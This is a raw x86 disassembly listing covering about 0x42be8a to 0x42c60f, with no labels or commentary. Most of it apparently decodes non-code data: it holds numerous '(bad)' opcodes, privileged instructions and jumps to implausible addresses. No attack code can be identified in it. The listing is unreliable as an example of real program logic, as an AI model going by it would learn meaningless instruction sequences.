  42be8a:	inc    ebp
  42be8b:	test   al,ch
  42be8d:	add    dh,bh
  42be8f:	add    bh,bh
  42be91:	dec    ebp
  42be92:	push   cs
  42be93:	mov    DWORD PTR [ecx],eax
  42be95:	hlt    
  42be96:	push   es
  42be97:	dec    ebp
  42be98:	leave  
  42be99:	mov    DWORD PTR [eax],ecx
  42be9b:	clc    
  42be9c:	cmovge eax,ecx
  42be9f:	mov    ecx,0x85c2f0
  42bea5:	clc    
  42bea6:	pop    DWORD PTR [ebp+0x1]
  42bea9:	push   ebx
  42beaa:	add    BYTE PTR [ebp-0x15],bh
  42bead:	push   esi
  42beae:	xor    eax,0x898a45
  42beb3:	cld    
  42beb4:	or     BYTE PTR [ebp+0x0],al
  42beb7:	xor    esp,DWORD PTR [esi-0x64]
  42beba:	add    DWORD PTR [esi+0x78308c1],edi
  42bec0:	add    ah,BYTE PTR [edx-0x49]
  42bec3:	int    0xbb
  42bec5:	mov    ecx,DWORD PTR [esi+0xc]
  42bec8:	add    dh,al
  42beca:	cmp    ecx,ebx
  42becc:	jne    0x42be96
  42bece:	xor    ecx,DWORD PTR [ebp+0x66]
  42bed1:	jmp    0xc9bed7
  42bed6:	add    DWORD PTR [ebp+0x0],eax
  42bed9:	mov    eax,ebx
  42bedb:	or     al,0x8b
  42bedd:	(bad)  
  42bede:	mov    ecx,esi
  42bee0:	mov    BYTE PTR [eax+eax*1+0x664c13c],cl
  42bee7:	mov    eax,edi
  42bee9:	or     BYTE PTR [edx],cl
  42beeb:	shl    cl,cl
  42beed:	icebp  
  42beee:	add    BYTE PTR [ebp+0x35],0x8b
  42bef2:	or     BYTE PTR [edx+eax*2],cl
  42bef5:	(bad)  
  42bef6:	or     cl,dh
  42bef8:	stc    
  42bef9:	shl    DWORD PTR [ebp-0x30],0xc6
  42befd:	xor    al,0x0
  42beff:	inc    ebp
  42bf00:	xchg   BYTE PTR [ebx],al
  42bf02:	add    esp,edi
  42bf04:	add    BYTE PTR [ebp-0x39],cl
  42bf07:	mov    al,bl
  42bf09:	test   DWORD PTR [ebx+0x1c348375],ecx
  42bf0f:	sub    al,0xbf
  42bf11:	jmp    0x42be98
  42bf13:	mov    edi,eax
  42bf15:	lock jge 0x42bf09
  42bf18:	lea    esi,[edx-0x74bad501]
  42bf1e:	mov    ebp,esp
  42bf20:	or     cl,dh
  42bf22:	leave  
  42bf23:	add    al,BYTE PTR [eax+eax*4-0x37ff9e00]
  42bf2a:	dec    ebp
  42bf2b:	dec    ebp
  42bf2c:	test   DWORD PTR [ebx],eax
  42bf2e:	paddb  mm6,mm0
  42bf31:	add    DWORD PTR [eax],eax
  42bf33:	dec    ebp
  42bf34:	mov    ecx,DWORD PTR [ebx-0x61b217f0]
  42bf3a:	mov    esi,DWORD PTR [edx]
  42bf3c:	or     al,0x2b
  42bf3e:	dec    ebp
  42bf3f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  42bf45:	mov    esp,esp
  42bf47:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  42bf4e:	mov    DWORD PTR [ebx],ebp
  42bf50:	call   0xc764880
  42bf55:	mov    DWORD PTR [ebp+0x10],ecx
  42bf58:	(bad)  
  42bf59:	push   0x8b85ff10
  42bf5e:	clc    
  42bf5f:	or     al,0x57
  42bf61:	(bad)  
  42bf62:	push   ecx
  42bf63:	retf   
  42bf64:	mov    ebx,0xff4d8dc8
  42bf69:	mov    DWORD PTR [ebp+0x8],eax
  42bf6c:	xor    eax,DWORD PTR [ebp-0x75]
  42bf6f:	cmp    ebp,DWORD PTR [ebx]
  42bf71:	lsl    ebx,WORD PTR [edi-0x8]
  42bf75:	call   DWORD PTR [ebx-0x741bff75]
  42bf7b:	(bad)  
  42bf7c:	or     al,0x5b
  42bf7e:	dec    ebp
  42bf7f:	or     BYTE PTR [ebx],dh
  42bf81:	inc    ebp
  42bf82:	xor    esi,DWORD PTR ds:0x708088d
  42bf88:	in     eax,0x9e
  42bf8a:	add    BYTE PTR [edx],dh
  42bf8c:	inc    ebp
  42bf8d:	pop    edi
  42bf8e:	xor    eax,edx
  42bf90:	test   DWORD PTR [eax],0x83108b8b
  42bf96:	dec    ebp
  42bf97:	adc    al,0x33
  42bf99:	inc    ebp
  42bf9a:	xor    esi,DWORD PTR ds:0xc73b9c2b
  42bfa0:	jne    0x42bf9e
  42bfa2:	mov    eax,DWORD PTR [ebp+0x345f808]
  42bfa8:	mov    eax,DWORD PTR [ebp-0xc]
  42bfab:	mov    DWORD PTR [eax],0x685c9f4
  42bfb1:	clc    
  42bfb2:	dec    ecx
  42bfb3:	push   edi
  42bfb4:	xor    eax,0x4dd51745
  42bfb9:	xlat   BYTE PTR ds:[ebx]
  42bfba:	or     BYTE PTR [ebx+0x4d62fc57],0xd1
  42bfc1:	mov    eax,0x780084d
  42bfc6:	push   edi
  42bfc7:	clc    
  42bfc8:	ret    0xe99e
  42bfcb:	xor    dl,dl
  42bfcd:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  42bfd3:	js     0x8894bd2
  42bfd9:	dec    ebp
  42bfda:	push   ebp
  42bfdb:	mov    edi,DWORD PTR [eax+0xc872fc]
  42bfe1:	lock enter 0xceca,0xf2
  42bfe6:	retf   0x18ce
  42bfe9:	jne    0x42c038
  42bfeb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  42bff1:	enter  0xf0d6,0xca
  42bff5:	retf   0xf2c8
  42bff8:	into   
  42bff9:	out    dx,al
  42bffa:	dec    ebp
  42bffb:	dec    ebp
  42bffc:	jmp    0xff46bf34
  42c001:	xor    eax,DWORD PTR [ebp-0x15]
  42c004:	xor    esi,DWORD PTR [ebx]
  42c006:	mov    esi,DWORD PTR [ebx]
  42c008:	sub    eax,DWORD PTR [ebx]
  42c00a:	add    eax,DWORD PTR [ebx]
  42c00c:	or     bl,dl
  42c00e:	dec    ebp
  42c00f:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  42c015:	xor    eax,DWORD PTR [ebp-0xf00073]
  42c01b:	jb     0x42c062
  42c01d:	add    BYTE PTR [ebx],dh
  42c01f:	dec    ebp
  42c020:	pop    esi
  42c021:	mov    ebp,ebx
  42c023:	cld    
  42c024:	mov    esi,eax
  42c026:	call   0x521117f3
  42c02b:	stc    
  42c02c:	add    eax,0x4572aa
  42c031:	pop    edi
  42c032:	leave  
  42c033:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  42c03a:	in     al,dx
  42c03b:	mov    eax,edi
  42c03d:	xor    eax,0xf8008520
  42c043:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  42c04a:	mov    eax,DWORD PTR [ebp-0x77]
  42c04d:	xor    al,0xf8
  42c04f:	pushf  
  42c050:	inc    ebp
  42c051:	(bad)  
  42c052:	cmp    eax,0x56869ce8
  42c057:	clc    
  42c058:	mov    edi,0x8518e4ec
  42c05e:	jmp    0xf056:0x8b457df8
  42c065:	push   edi
  42c066:	push   edi
  42c067:	push   ecx
  42c068:	push   ecx
  42c069:	push   edi
  42c06a:	xor    eax,esi
  42c06c:	mov    edx,0x32729e
  42c071:	add    ecx,eax
  42c073:	mov    edx,edi
  42c075:	clc    
  42c076:	retf   0xaf45
  42c079:	cmp    eax,0xc78b9ceb
  42c07e:	clc    
  42c07f:	cld    
  42c080:	jne    0x42c09a
  42c082:	xor    ebp,edx
  42c084:	xor    eax,DWORD PTR [ebp+0x3]
  42c087:	or     BYTE PTR [ebx],al
  42c089:	add    BYTE PTR [ebp-0x7747475],al
  42c08f:	hlt    
  42c090:	dec    ebp
  42c091:	dec    ebp
  42c092:	je     0x42c0c7
  42c094:	xor    esi,DWORD PTR [ebx]
  42c096:	xor    eax,DWORD PTR [ebx]
  42c098:	add    eax,DWORD PTR [ebx]
  42c09a:	add    ecx,DWORD PTR [edi]
  42c09c:	rol    ecx,cl
  42c09e:	mov    esi,DWORD PTR [ecx]
  42c0a0:	in     al,dx
  42c0a1:	inc    ebp
  42c0a2:	enter  0xca2b,0x33
  42c0a6:	icebp  
  42c0a7:	mov    DWORD PTR [edx],ecx
  42c0a9:	clc    
  42c0aa:	lock pop ebp
  42c0ac:	enter  0xf2e8,0xfe
  42c0b0:	retf   0xeeff
  42c0b3:	inc    ebp
  42c0b4:	jne    0x42c041
  42c0b6:	mov    edi,eax
  42c0b8:	cld    
  42c0b9:	dec    ebp
  42c0ba:	enter  0xbc89,0x8d
  42c0be:	sahf   
  42c0bf:	sti    
  42c0c0:	xor    bh,bh
  42c0c2:	mov    eax,DWORD PTR [ebp-0xc]
  42c0c5:	mov    esi,DWORD PTR [ebp-0x4]
  42c0c8:	xor    eax,esi
  42c0ca:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9e]
  42c0d1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  42c0d7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  42c0dd:	(bad)  
  42c0de:	push   ebp
  42c0df:	shr    esp,0x4d
  42c0e2:	in     al,dx
  42c0e3:	cmp    eax,DWORD PTR [esi+esi*2]
  42c0e6:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  42c0ec:	pushf  
  42c0ed:	mov    edi,0x85c7f445
  42c0f3:	call   0xf88847f0
  42c0f8:	xor    eax,0x53619cdb
  42c0fd:	dec    ebp
  42c0fe:	inc    ebp
  42c0ff:	mov    esi,DWORD PTR [esi]
  42c101:	clc    
  42c102:	pushf  
  42c103:	into   
  42c104:	mov    ecx,edi
  42c106:	in     al,dx
  42c107:	call   0x8b4b06ca
  42c10c:	pop    es
  42c10d:	or     BYTE PTR [ebx],dh
  42c10f:	or     BYTE PTR [edi+0x8a724d],bh
  42c115:	or     eax,edi
  42c117:	push   ebp
  42c118:	inc    ebp
  42c119:	cmpxchg8b (bad)
  42c11a:	(bad)  
  42c11b:	leave  
  42c11c:	loopne 0x42c0e8
  42c11e:	test   DWORD PTR [ebp-0x8],ecx
  42c121:	mov    eax,DWORD PTR [ebp-0x18]
  42c124:	aad    0x55
  42c126:	xlat   BYTE PTR ds:[ebx]
  42c127:	xor    eax,edi
  42c129:	add    esi,eax
  42c12b:	and    eax,DWORD PTR [eax]
  42c12d:	mov    eax,DWORD PTR [eax]
  42c12f:	(bad)  
  42c130:	leave  
  42c131:	sti    
  42c132:	inc    ebp
  42c133:	dec    DWORD PTR [ebx-0x39cc13ab]
  42c139:	mov    esi,ecx
  42c13b:	clc    
  42c13c:	(bad)  
  42c13d:	dec    ebp
  42c13e:	iret   
  42c13f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  42c145:	jb     0x42c143
  42c147:	add    bh,al
  42c149:	inc    ebp
  42c14a:	(bad)  
  42c14b:	mov    eax,DWORD PTR [ebp-0xc]
  42c14e:	(bad)  
  42c14f:	xabort 0x62
  42c152:	loopne 0x42c121
  42c154:	jmp    FWORD PTR [ebx]
  42c156:	mov    DWORD PTR [ebx],eax
  42c158:	clc    
  42c159:	lock inc ebp
  42c15b:	dec    ebp
  42c15c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  42c162:	loopne 0x42c197
  42c164:	inc    DWORD PTR [ebx]
  42c166:	mov    edi,DWORD PTR [ebx]
  42c168:	hlt    
  42c169:	jne    0x42c1b8
  42c16b:	mov    esi,DWORD PTR [ebx]
  42c16d:	in     al,0x8d
  42c16f:	dec    ebp
  42c170:	or     BYTE PTR [ebx],dh
  42c172:	jb     0x42c177
  42c174:	add    BYTE PTR [edi+0x45],bl
  42c177:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  42c17d:	add    BYTE PTR [ebx],dh
  42c17f:	mov    esi,DWORD PTR [ebx]
  42c181:	mov    ebp,DWORD PTR [ebx]
  42c183:	sbb    BYTE PTR [ebx-0x377403b3],cl
  42c189:	nop
  42c18a:	mov    ecx,0x338b4500
  42c18f:	add    DWORD PTR [ebx],0x70
  42c192:	mov    DWORD PTR [esi-0x8],edx
  42c195:	jne    0x42c1dc
  42c197:	mov    esi,DWORD PTR [esi]
  42c199:	push   edi
  42c19a:	pushf  
  42c19b:	push   edi
  42c19c:	mov    edx,DWORD PTR [ecx-0x15]
  42c19f:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  42c1a5:	add    BYTE PTR [ebx],dh
  42c1a7:	retf   
  42c1a8:	add    edx,ecx
  42c1aa:	ror    DWORD PTR [edi],cl
  42c1ac:	mov    DWORD PTR ds:0x7f452dfc,ebp
  42c1b2:	mov    ch,dl
  42c1b4:	mov    BYTE PTR [eax+0xb],dh
  42c1b7:	fimul  WORD PTR [ebp+0x0]
  42c1ba:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  42c1c0:	xor    esi,DWORD PTR [ebx]
  42c1c2:	mov    DWORD PTR [ebx],esi
  42c1c4:	or     BYTE PTR [ebx],al
  42c1c6:	dec    ebp
  42c1c7:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  42c1cd:	or     edi,0x8c64ca9e
  42c1d3:	out    dx,eax
  42c1d4:	loopne 0x42c1eb
  42c1d6:	(bad)  
  42c1d7:	jmp    0x13ec667
  42c1dc:	retf   0x4d4d
  42c1df:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  42c1e5:	je     0x3243608f
  42c1eb:	mov    ecx,DWORD PTR [ecx+0x45450818]
  42c1f1:	mov    DWORD PTR [ebx],esi
  42c1f3:	sbb    BYTE PTR [ecx-0x7472b3],bh
  42c1f9:	mov    eax,ecx
  42c1fb:	fmul   DWORD PTR [ebp+0x45]
  42c1fe:	mov    DWORD PTR ds:0xba459cf0,esi
  42c204:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  42c20a:	(bad)  
  42c20b:	mov    ecx,eax
  42c20d:	sbb    BYTE PTR [ecx-0x7474babb],dl
  42c213:	sbb    al,bh
  42c215:	add    dh,0x1
  42c218:	mov    DWORD PTR [eax],0x4dc1005e
  42c21e:	leave  
  42c21f:	mov    eax,DWORD PTR [eax+ebx*1]
  42c222:	push   ebp
  42c223:	mov    esp,ebp
  42c225:	add    DWORD PTR [ebp+0x0],eax
  42c228:	mov    ecx,DWORD PTR [ecx]
  42c22a:	or     BYTE PTR [eax-0x80],cl
  42c22d:	mov    DWORD PTR [ecx],eax
  42c22f:	or     al,0x0
  42c231:	inc    ebp
  42c232:	add    BYTE PTR [ebx],dh
  42c234:	in     al,dx
  42c235:	add    edx,DWORD PTR [ebx-0x77]
  42c238:	mov    esi,esp
  42c23a:	adc    BYTE PTR [ebp+0x16],al
  42c23d:	xor    edi,DWORD PTR [edi+0x7890803]
  42c243:	adc    al,0xcf
  42c245:	inc    ebp
  42c246:	sahf   
  42c247:	mov    esi,DWORD PTR [edx]
  42c249:	push   eax
  42c24a:	add    ebp,eax
  42c24c:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  42c252:	sahf   
  42c253:	mov    esp,DWORD PTR [eax+edi*1+0x42]
  42c257:	dec    ebp
  42c258:	fwait
  42c259:	dec    eax
  42c25a:	jmp    0xcdc6a0
  42c25f:	or     al,0x4d
  42c261:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  42c267:	or     al,0xd7
  42c269:	dec    ecx
  42c26a:	retf   
  42c26b:	dec    eax
  42c26c:	rcl    eax,cl
  42c26e:	retf   0xfc8
  42c271:	inc    ebp
  42c272:	or     eax,0x7f382d8b
  42c277:	sar    esp,0x3
  42c27a:	lahf   
  42c27b:	inc    eax
  42c27c:	mov    ebp,0x8b180089
  42c281:	inc    ebp
  42c282:	or     BYTE PTR [ebx],dh
  42c284:	iret   
  42c285:	add    ecx,ebx
  42c287:	mov    ecx,eax
  42c289:	adc    al,0x84
  42c28b:	inc    ebp
  42c28c:	add    al,0x33
  42c28e:	add    BYTE PTR [ebx],al
  42c290:	dec    ebp
  42c291:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  42c297:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  42c29d:	ret    
  42c29e:	inc    ebp
  42c29f:	add    edi,eax
  42c2a1:	push   ebp
  42c2a2:	or     bh,al
  42c2a4:	test   DWORD PTR [eax+edi*8],edx
  42c2a7:	test   DWORD PTR [eax+edi*8],esi
  42c2aa:	pushf  
  42c2ab:	inc    ebp
  42c2ac:	mov    DWORD PTR [edx],esi
  42c2ae:	lock pushf 
  42c2b0:	inc    ebp
  42c2b1:	(bad)  
  42c2b2:	mov    DWORD PTR [eax+ebx*1],edx
  42c2b5:	test   DWORD PTR [ebp-0x8],eax
  42c2b8:	mov    eax,DWORD PTR [ebp-0x70]
  42c2bb:	mov    eax,DWORD PTR [eax]
  42c2bd:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  42c2c3:	scas   eax,DWORD PTR es:[edi]
  42c2c4:	dec    ebp
  42c2c5:	mov    ecx,DWORD PTR [ebx+0x559008]
  42c2cb:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  42c2d1:	jb     0x42c320
  42c2d3:	add    BYTE PTR [ebx-0x387cf73f],cl
  42c2d9:	add    eax,ebx
  42c2db:	add    BYTE PTR [ebp+0x45],al
  42c2de:	mov    esi,DWORD PTR [ebx]
  42c2e0:	or     BYTE PTR [ebx],al
  42c2e2:	(bad)  
  42c2e3:	mov    ebx,eax
  42c2e5:	adc    al,0x45
  42c2e7:	inc    ebp
  42c2e8:	mov    eax,DWORD PTR [ebx]
  42c2ea:	or     al,0xdc
  42c2ec:	inc    eax
  42c2ed:	inc    ebp
  42c2ee:	cmp    edi,0xc
  42c2f1:	hlt    
  42c2f2:	inc    ebp
  42c2f3:	jne    0x42c280
  42c2f5:	mov    ecx,DWORD PTR [esp+ecx*1]
  42c2f8:	inc    eax
  42c2f9:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  42c2ff:	clc    
  42c300:	push   esp
  42c301:	inc    ebp
  42c302:	inc    ebp
  42c303:	cmp    eax,0x8b8b9c74
  42c308:	cmp    al,ah
  42c30a:	dec    ebp
  42c30b:	(bad)  
  42c30c:	mov    eax,ebx
  42c30e:	push   esp
  42c30f:	(bad)  
  42c310:	idiv   DWORD PTR [eax-0x87417dd]
  42c316:	or     al,0xff
  42c318:	inc    eax
  42c319:	inc    ebp
  42c31a:	add    eax,DWORD PTR [ebp-0x74748b15]
  42c320:	push   esp
  42c321:	loopne 0x42c368
  42c323:	(bad)  
  42c324:	mov    eax,ebx
  42c326:	or     bh,bh
  42c328:	xbegin 0x508808f1
  42c32e:	mov    ebx,esp
  42c330:	or     bh,bh
  42c332:	(bad)  
  42c333:	mov    eax,ebx
  42c335:	hlt    
  42c336:	inc    ebp
  42c337:	inc    ebp
  42c338:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  42c33e:	xor    ebp,DWORD PTR [ebx]
  42c340:	add    ecx,DWORD PTR [ecx+0x4589e089]
  42c346:	adc    al,0x8b
  42c348:	inc    ebp
  42c349:	clc    
  42c34a:	xor    eax,DWORD PTR [eax-0x64]
  42c34d:	add    eax,edi
  42c34f:	or     al,0x14
  42c351:	dec    ebp
  42c352:	test   DWORD PTR [ebx],edi
  42c354:	clc    
  42c355:	jb     0x42c39c
  42c357:	mov    esi,DWORD PTR [ecx]
  42c359:	clc    
  42c35a:	pushf  
  42c35b:	inc    eax
  42c35c:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  42c362:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  42c368:	shr    esi,0x4d
  42c36b:	add    BYTE PTR [ebx-0x30002f96],cl
  42c371:	hlt    
  42c372:	mov    WORD PTR [ebp-0x62],es
  42c375:	push   eax
  42c376:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  42c37d:	test   DWORD PTR [eax],eax
  42c37f:	clc    
  42c380:	mov    eax,DWORD PTR [ebp+0x8]
  42c383:	mov    edi,0x4585c3c8
  42c389:	clc    
  42c38a:	mov    eax,DWORD PTR [ebp+0x18]
  42c38d:	xor    eax,DWORD PTR [ebp-0x64]
  42c390:	mov    edi,eax
  42c392:	hlt    
  42c393:	shl    BYTE PTR [ebp-0x7b],0x8b
  42c397:	clc    
  42c398:	fmul   QWORD PTR [ebp+0x4d]
  42c39b:	mov    eax,ebp
  42c39d:	in     al,dx
  42c39e:	icebp  
  42c39f:	dec    ebp
  42c3a0:	dec    DWORD PTR [ecx+0x4dc7e845]
  42c3a6:	loopne 0x42c331
  42c3a8:	test   eax,edi
  42c3aa:	clc    
  42c3ab:	dec    ebp
  42c3ac:	inc    ebp
  42c3ad:	mov    DWORD PTR [ebx],esi
  42c3af:	in     al,0x3
  42c3b1:	dec    ebp
  42c3b2:	push   eax
  42c3b3:	xor    eax,DWORD PTR [ebp+0x3]
  42c3b6:	push   eax
  42c3b7:	mov    DWORD PTR [eax-0x20],edx
  42c3ba:	push   edi
  42c3bc:	mov    eax,DWORD PTR [eax]
  42c3be:	clc    
  42c3bf:	cmp    eax,0xf84e85c0
  42c3c4:	inc    ebp
  42c3c5:	test   BYTE PTR [ebx],dh
  42c3c7:	add    DWORD PTR [ebx],eax
  42c3c9:	add    BYTE PTR [eax+0x4d],dl
  42c3cc:	jne    0x42c401
  42c3ce:	lea    ecx,[ebx-0x7617fc48]
  42c3d4:	cmc    
  42c3d5:	adc    al,0xff
  42c3d7:	inc    ebp
  42c3d8:	inc    ebp
  42c3d9:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  42c3df:	jb     0x42c36c
  42c3e1:	add    ah,bl
  42c3e3:	inc    ebp
  42c3e4:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  42c3eb:	xor    ecx,DWORD PTR [ebp+0x3]
  42c3ee:	mov    edi,DWORD PTR [ebx]
  42c3f0:	adc    BYTE PTR [ebp+0x41],dh
  42c3f3:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  42c3f9:	ret    
  42c3fa:	push   ss
  42c3fb:	push   0x45
  42c3fd:	lea    ecx,[ebx+0x4de80cac]
  42c403:	cli    
  42c404:	add    edi,edi
  42c406:	or     BYTE PTR [ebp+0x4d],al
  42c409:	mov    ebp,DWORD PTR [ebx]
  42c40b:	xor    ebp,ecx
  42c40d:	mov    al,BYTE PTR [edx]
  42c40f:	add    eax,0xc7200
  42c414:	jne    0x42c463
  42c416:	lea    esi,[ebx]
  42c418:	lods   al,BYTE PTR ds:[esi]
  42c419:	psubsb mm0,mm0
  42c41c:	cmc    
  42c41d:	retf   
  42c41e:	inc    ecx
  42c420:	xor    eax,0x89019c84
  42c425:	add    ah,cl
  42c427:	inc    ebp
  42c428:	inc    ebp
  42c429:	mov    esi,DWORD PTR [ebx+esi*1]
  42c42c:	pushf  
  42c42d:	mov    al,bh
  42c42f:	add    eax,0x8572c4
  42c434:	clc    
  42c435:	dec    ebp
  42c436:	inc    ebp
  42c437:	xor    esi,DWORD PTR [edx]
  42c439:	setl   al
  42c43c:	(bad)  
  42c43d:	retf   
  42c43e:	int3   
  42c43f:	ror    DWORD PTR [ebp-0x7c],0x8d
  42c443:	add    eax,ecx
  42c445:	add    BYTE PTR [ebp+0x45],cl
  42c448:	lea    ecx,[ebx-0x75b2cc3c]
  42c44e:	lea    eax,ds:0x4d72c0
  42c454:	mov    ecx,DWORD PTR [ebp+0x8]
  42c457:	xor    ecx,edi
  42c459:	bswap  ebx
  42c45b:	ror    BYTE PTR [ebp-0x35],0xe9
  42c45f:	rol    DWORD PTR [ecx],0x84
  42c462:	add    BYTE PTR [ecx],al
  42c464:	xor    eax,DWORD PTR [eax]
  42c466:	pushf  
  42c467:	inc    ebp
  42c468:	jnp    0x8a42f86c
  42c46e:	mov    eax,DWORD PTR ds:0xcf72f0
  42c474:	lock dec ebp
  42c476:	retf   
  42c477:	xor    ecx,DWORD PTR [ebp+0xf]
  42c47a:	mov    eax,eax
  42c47c:	loopne 0x42c449
  42c47e:	test   ecx,0x19e8484
  42c484:	xor    al,BYTE PTR [eax]
  42c486:	mov    DWORD PTR [ebp-0x20],eax
  42c489:	mov    eax,DWORD PTR [ebp+0x33]
  42c48c:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  42c492:	ret    
  42c493:	add    al,cl
  42c495:	dec    ebp
  42c496:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42c49c:	add    ecx,DWORD PTR ds:0xc7250
  42c4a2:	inc    ebp
  42c4a3:	rcl    DWORD PTR [eax+0x4d],0x5f
  42c4a7:	mov    edi,edi
  42c4a9:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  42c4af:	jb     0x42c478
  42c4b1:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  42c4b8:	mov    esi,DWORD PTR [ebx]
  42c4ba:	or     BYTE PTR [edx+0x72b60dcf],cl
  42c4c0:	add    eax,DWORD PTR [eax]
  42c4c2:	cmp    ecx,eax
  42c4c4:	jne    0x42c542
  42c4ca:	mov    eax,DWORD PTR [ebp-0x18]
  42c4cd:	mov    eax,DWORD PTR [eax]
  42c4cf:	xor    eax,edi
  42c4d1:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  42c4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4db:	mov    ecx,edi
  42c4dd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c4e3:	jb     0x42c4f4
  42c4e5:	add    BYTE PTR [eax-0x3f],bl
  42c4e8:	add    BYTE PTR [ebp-0x75],cl
  42c4eb:	mov    edi,eax
  42c4ed:	xor    eax,DWORD PTR [eax]
  42c4ef:	mov    al,bh
  42c4f1:	or     eax,0x4a7284
  42c4f6:	xor    al,cl
  42c4f8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4fb:	mov    ecx,edi
  42c4fd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c503:	jb     0x42c514
  42c505:	add    BYTE PTR [eax],bh
  42c507:	enter  0x8500,0x8b
  42c50b:	add    ah,ah
  42c50d:	add    BYTE PTR [eax],al
  42c50f:	inc    ebp
  42c510:	(bad)  
  42c511:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  42c518:	mov    esi,DWORD PTR [edx+0x8]
  42c51b:	add    bh,cl
  42c51d:	dec    ebp
  42c51e:	mov    dh,0x8b
  42c520:	add    esi,DWORD PTR [ebx]
  42c522:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  42c528:	add    BYTE PTR [eax],al
  42c52a:	mov    eax,ecx
  42c52c:	call   0xc7cdc57e
  42c531:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d4a]
  42c538:	mov    eax,DWORD PTR [eax]
  42c53a:	in     al,dx
  42c53b:	ror    DWORD PTR [ecx],0x4d
  42c53e:	iret   
  42c53f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  42c546:	xor    dh,BYTE PTR [edx-0x75]
  42c549:	add    al,bh
  42c54b:	enter  0x5009,0xcf
  42c54f:	inc    ebp
  42c550:	mov    WORD PTR [ebx-0x75cdccb6],cs
  42c556:	or     al,BYTE PTR ds:0xec728b
  42c55c:	or     DWORD PTR [ebp-0x31],ecx
  42c55f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  42c566:	cmp    dh,BYTE PTR [edx+0xf]
  42c569:	add    ah,dl
  42c56b:	rol    DWORD PTR [eax],0x4d
  42c56e:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  42c574:	(bad)  
  42c575:	or     eax,0x4a7284
  42c57a:	xor    al,cl
  42c57c:	mov    ecx,DWORD PTR [ebp-0x18]
  42c57f:	mov    ecx,DWORD PTR [ecx]
  42c581:	xor    ecx,edi
  42c583:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  42c58a:	xor    cl,al
  42c58c:	mov    edx,DWORD PTR [eax]
  42c58e:	in     al,0x45
  42c590:	or     DWORD PTR [eax-0x31],edx
  42c593:	mov    ds:0x8b4aff8c,eax
  42c598:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  42c59f:	inc    ebp
  42c5a0:	or     DWORD PTR [ebx],esi
  42c5a2:	iret   
  42c5a3:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144e]
  42c5aa:	cmp    dh,BYTE PTR [ebx]
  42c5ac:	jge    0x7242f642
  42c5b2:	mov    eax,DWORD PTR [eax]
  42c5b4:	in     al,0xc7
  42c5b6:	add    BYTE PTR [ebp-0x39],cl
  42c5b9:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b6]
  42c5c0:	mov    edx,ecx
  42c5c2:	clc    
  42c5c3:	test   BYTE PTR [ecx],cl
  42c5c5:	std    
  42c5c6:	iret   
  42c5c7:	dec    DWORD PTR [ebp+eax*2+0x14328b4a]
  42c5ce:	xor    al,bh
  42c5d0:	mov    eax,ebx
  42c5d2:	in     al,dx
  42c5d3:	enter  0x1109,0xcf
  42c5d7:	inc    ebp
  42c5d8:	mov    WORD PTR [ebx-0x38cde7b6],cs
  42c5de:	or     al,BYTE PTR [ebx+ecx*4+0x932f89e]
  42c5e5:	jmp    0x42c5b6
  42c5e7:	push   0xffffff8c
  42c5e9:	dec    DWORD PTR [esi-0xc]
  42c5ec:	xor    al,BYTE PTR [ebp+0x3a]
  42c5ef:	push   eax
  42c5f0:	jne    0x42c60c
  42c5f2:	mov    edi,edi
  42c5f4:	in     al,0x8b
  42c5f6:	add    BYTE PTR [eax],cl
  42c5f8:	(bad)  
  42c5f9:	dec    ebp
  42c5fa:	test   BYTE PTR [ebx],dh
  42c5fc:	dec    edx
  42c5fd:	add    esi,DWORD PTR [edx]
  42c5ff:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  42c605:	or     bh,cl
  42c607:	(bad)  
  42c608:	mov    ebx,es
  42c60a:	dec    edx
  42c60b:	push   0x32
  42c60d:	lea    esi,[edx]
  42c60f:	xchg   esp,eax
